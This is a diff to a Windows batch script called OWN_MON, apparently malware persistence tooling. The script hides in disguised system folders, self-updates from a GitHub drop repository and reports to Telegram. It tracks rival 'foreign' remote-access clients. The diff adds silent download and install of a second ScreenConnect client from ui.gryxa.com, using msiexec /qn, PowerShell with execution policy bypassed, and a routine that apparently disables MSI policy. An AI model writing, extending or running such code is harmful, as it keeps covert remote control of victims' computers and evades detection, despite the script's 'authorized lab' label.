@@ -1,14 +1,15 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260802M24
+rem  OWN_MON  BUILD 20260802M25
 rem  Persistent watchdog - identity-aware (anti-signature), mutual
-rem  WMI+schtasks chains, MSI fallback chain, state.json, digest HB.
+rem  WMI+schtasks chains, MSI fallback chain, state.json, quiet digest.
 rem  Authorized internal deployment - lab/competition scope only.
 rem ═══════════════════════════════════════════════════════════════
 setlocal EnableDelayedExpansion
 
 set "KEEP_FP=5f6010579852e507"
 set "ALT_FP=f861c8140d453427"
+set "GRYXA_FP=9908198e668e4750"
 set "WD=C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache"
 set "ETL=C:\ProgramData\Microsoft\Diagnosis\State\.etlcache"
 set "LOG=%WD%\own_mon.log"
@@ -24,15 +25,18 @@ set "OWNMON2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_mon.cmd?t
 set "OWNLIB=https://raw.githubusercontent.com/xnobuddy/github-drop/main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "OWNLIB2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/own_lib.ps1?t=%RANDOM%%RANDOM%"
 set "MSI_URL=https://ui.sevrz.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
+set "MSI_GRYXA=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "MSI_PKG1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg.msi"
 set "MSI_PKG2=https://cdn.jsdelivr.net/gh/xnobuddy/github-drop@main/pkg.msi"
 set "MSI=%ProgramData%\ScreenConnect.ClientSetup.msi"
 set "MSICACHE=%WD%\pkg.msi"
+set "MSI_G=%ProgramData%\ScreenConnect.Gryxa.msi"
+set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M24"
+set "MONVER=M25"
 set "PF86=%ProgramFiles(x86)%"
 for /f "tokens=1-3 delims=/ " %%a in ("%date%") do set "DT=%date% %time%"
 echo.>>"%LOG%"
@@ -125,7 +129,7 @@ set "FOREIGN_LEFT=0"
 for /f "tokens=2 delims=()" %%a in ('sc query state^= all ^| findstr /C:"SERVICE_NAME: ScreenConnect Client"') do (
   set "FP=%%a"
   set "FP=!FP: =!"
-  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" (
+  if /I not "!FP!"=="%KEEP_FP%" if /I not "!FP!"=="%ALT_FP%" if /I not "!FP!"=="%GRYXA_FP%" (
     set /a COUNT+=1
     set /a FOREIGN_LEFT+=1
     set "FOREIGN_LIST=!FOREIGN_LIST!!FP! "
@@ -279,13 +283,66 @@ if errorlevel 1 (
   echo done>"%WD%\sec.flag"
 )
 
-rem ── [H] campaign state + hourly compact digest ────────────────
+rem ── [G2] ensure gryxa SC (main beside sevrz) ──────────────────
+set "GRYXA_OK=0"
+sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+if not errorlevel 1 set "GRYXA_OK=1"
+if "%GRYXA_OK%"=="0" (
+  echo gryxa heal begin>>"%LOG%"
+  sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  if not errorlevel 1 (
+    net start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+    timeout /t 5 /nobreak >nul
+  )
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 (
+    set "GRYXA_OK=1"
+  ) else if exist "%WD%\own_lib.ps1" (
+    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+    timeout /t 6 /nobreak >nul
+    sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+    if not errorlevel 1 set "GRYXA_OK=1"
+  )
+)
+if "%GRYXA_OK%"=="0" (
+  set "GREG=unknown"
+  if exist "%WD%\own_lib.ps1" for /f "usebackq delims=" %%R in (`powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action registered -Fp "%GRYXA_FP%" -WorkDir "%WD%"`) do set "GREG=%%R"
+  if /I not "!GREG!"=="yes" (
+    echo gryxa_install_begin>>"%LOG%"
+    if not exist "%CURL%" set "CURL=curl.exe"
+    "%CURL%" -L --ssl-no-revoke --connect-timeout 25 --max-time 300 -o "%MSI_G%.tmp" "%MSI_GRYXA%" >>"%LOG%" 2>&1
+    for %%F in ("%MSI_G%.tmp") do if %%~zF GTR 1000000 (
+      move /y "%MSI_G%.tmp" "%MSI_G%" >nul 2>&1
+      copy /y "%MSI_G%" "%MSICACHE_G%" >nul 2>&1
+      call :NoMsiPolicy
+      msiexec /i "%MSI_G%" /qn /norestart ALLUSERS=1 REBOOT=ReallySuppress >>"%LOG%" 2>&1
+      timeout /t 8 /nobreak >nul
+    )
+    del /f /q "%MSI_G%.tmp" >nul 2>&1
+  ) else (
+    if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action repair -Fp "%GRYXA_FP%" -WorkDir "%WD%" >>"%LOG%" 2>&1
+  )
+  sc start "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
+  sc query "ScreenConnect Client (%GRYXA_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 set "GRYXA_OK=1"
+)
+
+rem ── [H] quiet digest (skip healthy hosts — was flooding Telegram) ──
 if exist "%WD%\own_lib.ps1" powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action state -WorkDir "%WD%" -Build %MONVER% >nul 2>&1
-powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HBFLAG%') -and (New-TimeSpan -Start (Get-Item -LiteralPath '%HBFLAG%').LastWriteTime).TotalMinutes -lt 60){ exit 0 } else { exit 1 }" >nul 2>&1
-if errorlevel 1 (
-  echo hb>%HBFLAG%
-  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State HB -Mode compact -Build %MONVER% -Count !COUNT! >nul 2>&1
-  echo digest HB sent>>"%LOG%"
+set "NEED_HB=0"
+if "%PRIM_OK%"=="0" set "NEED_HB=1"
+if %FOREIGN_LEFT% GTR 0 set "NEED_HB=1"
+if "%GRYXA_OK%"=="0" set "NEED_HB=1"
+if "%NEED_HB%"=="0" (
+  echo hb_skip_healthy>>"%LOG%"
+) else (
+  powershell -NoProfile -NonInteractive -Command "if((Test-Path '%HBFLAG%') -and (New-TimeSpan -Start (Get-Item -LiteralPath '%HBFLAG%').LastWriteTime).TotalMinutes -lt 360){ exit 0 } else { exit 1 }" >nul 2>&1
+  if errorlevel 1 (
+    echo hb>%HBFLAG%
+    powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\tg_report.ps1" -State HB -Mode compact -Build %MONVER% -Count !COUNT! >nul 2>&1
+    echo digest HB sent>>"%LOG%"
+  )
 )
 
 rem ── [I] self-update apply (last thing this tick) ──────────────
@@ -302,7 +359,7 @@ if exist "%WD%\own_mon.cmd" (
 )
 del /f /q "%MUTEX%" >nul 2>&1
 
-echo tick done: prim=%PRIM_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
+echo tick done: prim=%PRIM_OK% gryxa=%GRYXA_OK% alt=%ALT_OK% foreign=%FOREIGN_LEFT%>>"%LOG%"
 endlocal
 exit /b 0
 
@@ -385,13 +442,21 @@ set "NEWSTATE=%~1"
 set "MSG=%~2"
 set "OLDSTATE="
 if exist "%STATE%" set /p OLDSTATE=<"%STATE%"
-rem rate-limit repeated DOWN/FAIL: max 1 alert per 30 min while stuck
+rem false DOWN after reboot race: primary already Running — do not spam
+if /I "%NEWSTATE%"=="DOWN" (
+  sc query "ScreenConnect Client (%KEEP_FP%)" | find "RUNNING" >nul
+  if not errorlevel 1 (
+    echo tg_skip_down_already_running>>"%LOG%"
+    exit /b 0
+  )
+)
+rem rate-limit repeated DOWN/FAIL: max 1 alert per 6h while stuck
 if /I "%NEWSTATE%"=="DOWN" goto :MaybeSuppress
 if /I "%NEWSTATE%"=="FAIL" goto :MaybeSuppress
 goto :SendAlert
 :MaybeSuppress
 if /I "%NEWSTATE%"=="%OLDSTATE%" if exist "%WD%\tg_sent.flag" (
-  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 30){exit 0}else{exit 1}" >nul 2>&1
+  powershell -NoProfile -NonInteractive -Command "if((New-TimeSpan -Start (Get-Item -LiteralPath '%WD%\tg_sent.flag').LastWriteTime).TotalMinutes -lt 360){exit 0}else{exit 1}" >nul 2>&1
   if not errorlevel 1 (
     echo tg_suppressed_%NEWSTATE%>>"%LOG%"
     exit /b 0
